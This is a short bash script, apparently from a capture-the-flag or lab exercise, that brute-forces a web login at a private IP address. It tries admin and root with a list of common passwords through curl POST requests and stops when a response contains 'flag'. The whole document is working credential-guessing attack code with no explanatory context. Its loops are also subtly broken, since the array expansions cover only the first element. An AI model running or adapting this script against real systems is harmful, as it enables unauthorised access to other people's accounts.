usernames=(admin root)
passwords=(shadow matrix ghost anna sara singnin amy charlie aa123456 donald password1 qwerty123 zxcvbnm121212 bailey)

IP=192.168.1.113
for user in ${usernames}; do
  for pass in ${passwords}; do
    echo "http://$IP/index.php?page=signin&username=${user}&password=${pass}&Login=Login#"
	  curl -X POST "http://$IP/index.php?page=signin&username=${user}&password=${pass}&Login=Login#" | grep 'flag' && exit 1 || continue
  done
done